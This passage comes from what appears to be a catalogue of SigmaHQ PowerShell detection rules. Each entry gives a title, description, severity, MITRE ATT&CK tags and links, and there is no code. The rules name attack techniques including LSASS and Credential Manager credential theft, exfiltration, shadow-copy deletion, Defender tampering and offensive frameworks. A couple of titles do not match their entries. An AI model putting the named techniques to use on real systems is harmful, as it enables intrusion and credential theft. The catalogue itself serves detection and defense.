* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_dnsexfiltration.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.md#atomic-test-3---dnsexfiltration-doh

* https://github.com/Arno0x/DNSExfiltrator

    
### Execution via CL_Invocation.ps1
    
    Detects Execution via SyncInvoke in CL_Invocation.ps1 module

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_cl_invocation_lolscript.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml

* https://twitter.com/bohops/status/948061991012327424

    
### Manipulation of User Computer or Group Security Principals Across AD
    
    Adversaries may create a domain account to maintain access to victim systems.
Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain..


    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1136.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_directoryservices_accountmanagement.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.md#atomic-test-3---create-a-new-domain-account-using-powershell

* https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.accountmanagement?view=dotnet-plat-ext-6.0

    
### Invoke-Obfuscation Via Stdin
    
    Detects Obfuscated Powershell via Stdin in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_stdin.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Security Software Discovery by Powershell
    
    Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment.
This may include things such as firewall rules and anti-viru


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1518.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_security_software_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md

    
### Windows Firewall Profile Disabled
    
    Detects when a user disables the Windows Firewall via a Profile to help evade defense.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_windows_firewall_profile_disabled.yml
* https://docs.microsoft.com/en-us/powershell/module/netsecurity/set-netfirewallprofile?view=windowsserver2019-ps

* https://www.tutorialspoint.com/how-to-get-windows-firewall-profile-settings-using-powershell

* http://powershellhelp.space/commands/set-netfirewallrule-psv5.php

* http://woshub.com/manage-windows-firewall-powershell/

    
### Invoke-Obfuscation Via Use MSHTA
    
    Detects Obfuscated Powershell via use MSHTA in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_mhsta.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Invoke-Obfuscation Via Use Clip
    
    Detects Obfuscated Powershell via use Clip.exe in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_clip.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Powershell Directory Enumeration
    
    Detects technique used by MAZE ransomware to enumerate directories using Powershell

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_directory_enum.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md

* https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents

    
### PowerShell Credential Prompt
    
    Detects PowerShell calling a credential prompt

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_prompt_credentials.yml
* https://twitter.com/JohnLaTwC/status/850381440629981184

* https://t.co/ezOTGy1a1G

    
### Suspicious GetTypeFromCLSID ShellExecute
    
    Detects suspicious Powershell code that execute COM Objects

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.persistence
    * MITRE: attack.t1546.015
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_gettypefromclsid.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.md#atomic-test-2---powershell-execute-com-object

    
### PowerShell ShellCode
    
    Detects Base64 encoded Shellcode

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_shellcode_b64.yml
* https://twitter.com/cyb3rops/status/1063072865992523776

    
### Suspicious Start-Process PassThru
    
    Powershell use PassThru option to start in background

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_start_process.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/Start-Process?view=powershell-5.1&viewFallbackFrom=powershell-7

    
### Windows PowerShell Upload Web Request
    
    Detects the use of various web request POST or PUT methods (including aliases) via Windows PowerShell command

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1020
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_upload.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1020/T1020.md

* https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2

    
### Suspicious PowerShell Get Current User
    
    Detects the use of PowerShell to identify the current logged user.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_get_current_user.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md#atomic-test-4---user-discovery-with-env-vars-powershell-script

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md#atomic-test-5---getcurrent-user-with-powershell-script

    
### Malicious PowerShell Commandlets
    
    Detects Commandlet names from well-known PowerShell exploitation frameworks

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml
* https://adsecurity.org/?p=2921

    
### Password Policy Discovery With Get-AdDefaultDomainPasswordPolicy
    
    Detetcts PowerShell activity in which Get-Addefaultdomainpasswordpolicy is used to get the default password policy for an Active Directory domain.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1201
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_get_addefaultdomainpasswordpolicy.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1201/T1201.md#atomic-test-9---enumerate-active-directory-password-policy-with-get-addefaultdomainpasswordpolicy

* https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy

    
### Change User Agents with WebRequest
    
    Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.
Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_invoke_webrequest_useragent.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.001/T1071.001.md#t1071001---web-protocols

    
### Clearing Windows Console History
    
    Identifies when a user attempts to clear console history. An adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070
    * MITRE: attack.t1070.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_clearing_windows_console_history.yml
* https://stefanos.cloud/blog/kb/how-to-clear-the-powershell-command-history/

* https://www.shellhacks.com/clear-history-powershell/

* https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics

    
### Clear PowerShell History
    
    Detects keywords that could indicate clearing PowerShell history

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_clear_powershell_history.yml
* https://gist.github.com/hook-s3c/7363a856c3cdbadeb71085147f042c1a

    
### Powershell XML Execute Command
    
    Adversaries may abuse PowerShell commands and scripts for execution.
PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell)
Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code


    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_xml_iex.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-8---powershell-xml-requests

    
### Automated Collection Bookmarks Using Get-ChildItem PowerShell
    
    Adversaries may enumerate browser bookmarks to learn more about compromised hosts.
Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about
internal network resources such as servers, tools/dashboards, or other related infrastructure.


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1217
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_get_childitem_bookmarks.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md

    
### Remove Account From Domain Admin Group
    
    Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users.
Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. 


    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1531
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_remove_adgroupmember.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1531/T1531.md#atomic-test-3---remove-account-from-domain-admin-group

    
### Suspicious Mount-DiskImage
    
    Adversaries may abuse container files such as disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW.

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1553.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_mount_diskimage.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image

* https://docs.microsoft.com/en-us/powershell/module/storage/mount-diskimage?view=windowsserver2022-ps

    
### Invoke-Obfuscation COMPRESS OBFUSCATION
    
    Detects Obfuscated Powershell via COMPRESS OBFUSCATION

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_compress.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### PowerShell Get-Process LSASS in ScriptBlock
    
    Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_getprocess_lsass.yml
* https://twitter.com/PythonResponder/status/1385064506049630211

    
### Enumerate Credentials from Windows Credential Manager With PowerShell
    
    Adversaries may search for common password storage locations to obtain user credentials.
Passwords are stored in several places on a system, depending on the operating system or application holding the credentials.


    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1555
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_enumerate_password_windows_credential_manager.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.md

    
### Suspicious Enumerate Active Directory Groups with Get-AdComputer
    
    Detects the use of Get-AdGroup to enumerate Groups within Active Directory

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_get_adgroup.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md

    
### Suspicious Get Information for SMB Share
    
    Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and
to identify potential systems of interest for Lateral Movement.
Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. 


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_smb_share_reco.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md

    
### Code Executed Via Office Add-in XLL File
    
    Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system.
Office add-ins can be used to add functionality to Office programs


    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1137.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_office_comobject_registerxll.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.md

    
### Root Certificate Installed
    
    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1553.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_root_certificate_installed.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md

    
### Use Remove-Item to Delete File
    
    Powershell Remove-Item  with -Path to delete a file or a folder with "-Recurse"

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_remove_item_path.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/Remove-Item?view=powershell-5.1&viewFallbackFrom=powershell-7

    
### Execution via CL_Invocation.ps1 (2 Lines)
    
    Detects Execution via SyncInvoke in CL_Invocation.ps1 module

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_cl_invocation_lolscript_count.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml

* https://twitter.com/bohops/status/948061991012327424

    
### Powershell Timestomp
    
    Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_timestomp.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md

* https://www.offensive-security.com/metasploit-unleashed/timestomp/

    
### Dump Credentials from Windows Credential Manager With PowerShell
    
    Adversaries may search for common password storage locations to obtain user credentials.
Passwords are stored in several places on a system, depending on the operating system or application holding the credentials.


    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1555
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_dump_password_windows_credential_manager.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.md

    
### Execute Invoke-command on Remote Host
    
    Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_command_remote.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-2---invoke-command

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.2

    
### Invoke-Obfuscation Via Use Rundll32
    
    Detects Obfuscated Powershell via use Rundll32 in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_use_rundll32.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Powershell MsXml COM Object
    
    Adversaries may abuse PowerShell commands and scripts for execution.
PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell)
Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code


    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_msxml_com.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-7---powershell-msxml-com-object---with-prompt

* https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms766431(v=vs.85)

* https://www.trendmicro.com/en_id/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-x.html

    
### Create Volume Shadow Copy with Powershell
    
    Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_create_volume_shadow_copy.yml
* https://attack.mitre.org/datasources/DS0005/

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1&viewFallbackFrom=powershell-7

    
### AzureHound PowerShell Commands
    
    Detects the execution of AzureHound in PowerShell, a tool to gather data from Azure for BloodHound

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1482
    * MITRE: attack.t1087
    * MITRE: attack.t1087.001
    * MITRE: attack.t1087.002
    * MITRE: attack.t1069.001
    * MITRE: attack.t1069.002
    * MITRE: attack.t1069
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_azurehound_commands.yml
* https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/AzureHound.ps1

* https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html

    
### Malicious Nishang PowerShell Commandlets
    
    Detects Commandlet names and arguments from the Nishang exploitation framework

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_nishang_malicious_commandlets.yml
* https://github.com/samratashok/nishang

    
### Request A Single Ticket via PowerShell
    
    utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer.
This behavior is typically used during a kerberos or silver ticket attack.
A successful execution will output the SPNs for the endpoint in question.


    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_request_kerberos_ticket.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.md#atomic-test-4---request-a-single-ticket-via-powershell

    
### Suspicious Get-WmiObject
    
    The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.t1546
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_gwmi.yml
* https://attack.mitre.org/datasources/DS0005/

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1&viewFallbackFrom=powershell-7

    
### Delete Volume Shadow Copies via WMI with PowerShell
    
    Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_win32_shadowcopy.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-5---windows---delete-volume-shadow-copies-via-wmi-with-powershell

    
### Suspicious New-PSDrive to Admin Share
    
    Adversaries may use to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_new_psdrive.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md#atomic-test-2---map-admin-share-powershell

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.2

    
### Malicious PowerView PowerShell Commandlets
    
    Detects Commandlet names from PowerView of PowerSploit exploitation framework.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_powerview_malicious_commandlets.yml
* https://powersploit.readthedocs.io/en/stable/Recon/README

* https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

* https://thedfirreport.com/2020/10/08/ryuks-return

* https://adsecurity.org/?p=2277

    
### Suspicious Start-Process PassThru
    
    Attempting to disable scheduled scanning and other parts of windows defender atp. Or set default actions to allow.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_tamper_defender.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps

* https://bidouillesecurity.com/disable-windows-defender-in-powershell/

    
### Execution via CL_Mutexverifiers.ps1
    
    Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_cl_mutexverifiers_lolscript.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml

* https://twitter.com/pabraeken/status/995111125447577600

    
### PrintNightmare Powershell Exploitation
    
    Detects Commandlet name for PrintNightmare exploitation.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_nightmare.yml
* https://github.com/calebstewart/CVE-2021-1675

    
### Suspicious Get-ADReplAccount
    
    The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_get_adreplaccount.yml
* https://www.powershellgallery.com/packages/DSInternals

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.md#atomic-test-2---run-dsinternals-get-adreplaccount

    
### Suspicious Enumerate Active Directory Computers with Get-AdComputer
    
    utilize Get-AdComputer to enumerate Computers within Active Directory.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1018
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_get_adcomputer.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md

    
### Suspicious Process Discovery With Get-Process
    
    Get the processes that are running on the local computer.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1057
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_get_process.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1057/T1057.md#atomic-test-3---process-discovery---get-process

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7

    
### Suspicious PowerShell Invocations - Specific
    
    Detects suspicious PowerShell invocation command parameters

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_invocation_specific.yml
    
### Powershell Store File In Alternate Data Stream
    
    Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_store_file_in_alternate_data_stream.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md

    
### DirectorySearcher Powershell Exploitation
    
    Enumerates Active Directory to determine computers that are joined to the domain

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1018
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_directorysearcher.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md#atomic-test-15---enumerate-domain-computers-within-active-directory-using-directorysearcher

    
### Powershell Detect Virtualization Environment
    
    Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1497.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_detect_vm_env.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1497.001/T1497.001.md

* https://techgenix.com/malicious-powershell-scripts-evade-detection/

    
### Get-ADUser Enumeration Using UserAccountControl Flags
    
    Detects AS-REP roasting is an attack that is often-overlooked. It is not very common as you have to explicitly set accounts that do not require pre-authentication.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1057
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_as_rep_roasting.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md#atomic-test-11---get-aduser-enumeration-using-useraccountcontrol-flags-as-rep-roasting

* https://shellgeek.com/useraccountcontrol-flags-to-manipulate-properties/

    
### Powershell LocalAccount Manipulation
    
    Adversaries may manipulate accounts to maintain access to victim systems.
Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups


    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_localuser.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md#atomic-test-1---admin-account-manipulate

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/?view=powershell-5.1

    
### Malicious ShellIntel PowerShell Commandlets
    
    Detects Commandlet names from ShellIntel exploitation scripts.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_shellintel_malicious_commandlets.yml
* https://github.com/Shellntel/scripts/

    
### Powershell Local Email Collection
    
    Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1114.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_mail_acces.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/T1114.001.md

    
### Winlogon Helper DLL
    
    Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon. Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables.
